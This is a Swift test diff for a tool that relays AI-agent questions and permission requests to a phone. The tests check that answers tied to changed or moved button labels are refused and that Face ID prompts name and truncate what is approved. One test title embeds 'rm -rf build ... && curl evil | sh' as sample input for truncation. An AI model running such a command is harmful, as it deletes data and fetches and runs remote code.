@@ -30,7 +30,7 @@ import Testing
     }
 
     @Test func aButtonAnswersTheSingleChoiceQuestion() throws {
-        guard case .answer(let question, let answer) = try PushReplyPlan.make(reply(.question, .option(1)), pending: single()) else {
+        guard case .answer(let question, let answer) = try PushReplyPlan.make(reply(.question, .option(1, label: "B")), pending: single()) else {
             Issue.record("not an answer")
             return
         }
@@ -65,7 +65,7 @@ import Testing
     }
 
     @Test func anAnsweredPromptIsRefused() {
-        #expect(throws: PushReplyPlan.Refusal.self) { try PushReplyPlan.make(reply(.question, .option(0)), pending: nil) }
+        #expect(throws: PushReplyPlan.Refusal.self) { try PushReplyPlan.make(reply(.question, .option(0, label: "A")), pending: nil) }
     }
 
     @Test func textRepliesPromptTheSessionOnceOrReachChief() throws {
@@ -86,5 +86,81 @@ import Testing
         let messages = PushSnapshots.messages([a, b])
         #expect(messages.map(\.text) == ["fix it", "done", "ship", "rate limited"])
         #expect(messages.map(\.role) == [.user, .agent, .user, .system])
+    }
+}
+
+/// Review of #24156 (M1, #5): an answer is bound to the labels the person saw.
+@Suite struct PushReplyLabelTests {
+    func pending(_ text: String) throws -> AgentSessionEvent {
+        let request = try JSONDecoder().decode(JSONValue.self, from: Data(text.utf8))
+        return try #require(AcpmuxRecords(sessionID: "s").permission("q1", request: request))
+    }
+
+    func ask(_ labels: [String], multi: Bool = false) throws -> AgentSessionEvent {
+        let options = labels.map { #"{"label":"\#($0)"}"# }.joined(separator: ",")
+        return try pending(#"{"toolCall":{"toolCallId":"q1","title":"Question","kind":"other","_meta":{"claude":{"tool":"AskUserQuestion"}},"rawInput":{"questions":[{"question":"Deploy?","options":[\#(options)],"multiSelect":\#(multi)}]}},"options":[{"optionId":"allow_once","name":"Answer","kind":"allow_once"},{"optionId":"reject_once","name":"Reject","kind":"reject_once"}]}"#)
+    }
+
+    func reply(_ action: PushReply.Action) -> PushReply {
+        PushReply(mac: "m", kind: .question, sessionId: "s", permissionId: "q1", action: action)
+    }
+
+    func chosen(_ plan: PushReplyPlan) throws -> AgentQuestionJSON? {
+        guard case .answer(let question, let answer) = plan else { return nil }
+        return try question.reply(answer).answers
+    }
+
+    @Test func aButtonWhoseLabelChangedIsRefused() throws {
+        // The Worker swapped the labels: the button said "No" at the place of "Yes, deploy".
+        #expect(throws: PushReplyPlan.Refusal.self) {
+            try PushReplyPlan.make(reply(.option(0, label: "No")), pending: ask(["Yes, deploy", "No"]))
+        }
+    }
+
+    @Test func aButtonWhoseOptionMovedIsRefusedNotGuessed() throws {
+        // The Mac's list changed since the push: the index names another option now.
+        #expect(throws: PushReplyPlan.Refusal.self) {
+            try PushReplyPlan.make(reply(.option(1, label: "No")), pending: ask(["No", "Yes, deploy"]))
+        }
+        let plan = try PushReplyPlan.make(reply(.option(1, label: "Yes, deploy")), pending: ask(["No", "Yes, deploy"]))
+        #expect(try chosen(plan) == .object(["Deploy?": .string("Yes, deploy")]))
+    }
+
+    @Test func aCutLabelStillMatchesItsOption() throws {
+        let long = "Deploy the staging branch to production right now please"
+        let plan = try PushReplyPlan.make(reply(.option(0, label: "Deploy the staging bran…")), pending: ask([long, "No"]))
+        #expect(try chosen(plan) == .object(["Deploy?": .string(long)]))
+    }
+
+    @Test func formAnswersMatchCutLabelsAndRefuseUnknownOnes() throws {
+        let long = "Run the whole integration suite on every platform"
+        let ok = try PushReplyPlan.make(reply(.answers(selected: [["Run the whole integra…", "B"]], other: [""])), pending: ask([long, "B"], multi: true))
+        #expect(try chosen(ok) == .object(["Deploy?": .string("\(long), B")]))
+        #expect(throws: PushReplyPlan.Refusal.self) {
+            try PushReplyPlan.make(reply(.answers(selected: [["B", "Gone"]], other: [""])), pending: ask(["A", "B"], multi: true))
+        }
+    }
+}
+
+/// The Face ID prompt names what is being sent (review M1, L3).
+@Suite struct ApprovalReasonTests {
+    @Test func anAnswerNamesItsChoices() throws {
+        let request = try JSONDecoder().decode(JSONValue.self, from: Data(#"{"toolCall":{"toolCallId":"q1","title":"Question","kind":"other","_meta":{"claude":{"tool":"AskUserQuestion"}},"rawInput":{"questions":[{"question":"Deploy?","options":[{"label":"Yes, deploy"},{"label":"No"}],"multiSelect":false}]}},"options":[{"optionId":"allow_once","name":"Answer","kind":"allow_once"}]}"#.utf8))
+        guard case .question(let question) = try #require(AcpmuxRecords(sessionID: "s").permission("q1", request: request)),
+              let item = question.items.first else {
+            Issue.record("no question")
+            return
+        }
+        let answer = AgentQuestionAnswer(selections: [item.id: .init(optionIDs: [item.options[0].id])])
+        #expect(AcpmuxHub.answerReason(question, answer) == "Answer “Yes, deploy”")
+        let other = AgentQuestionAnswer(selections: [item.id: .init(optionIDs: [], other: "ship it")])
+        #expect(AcpmuxHub.answerReason(question, other) == "Answer “ship it”")
+    }
+
+    @Test func aLongTitleIsMarkedAsCut() {
+        let reason = AcpmuxHub.allowReason(title: "rm -rf build " + String(repeating: "x", count: 100) + " && curl evil | sh")
+        #expect(reason.hasSuffix("…”"))
+        #expect(AcpmuxHub.allowReason(title: "ls") == "Allow “ls”")
+        #expect(AcpmuxHub.allowReason(title: "") == "Allow the agent's request")
     }
 }
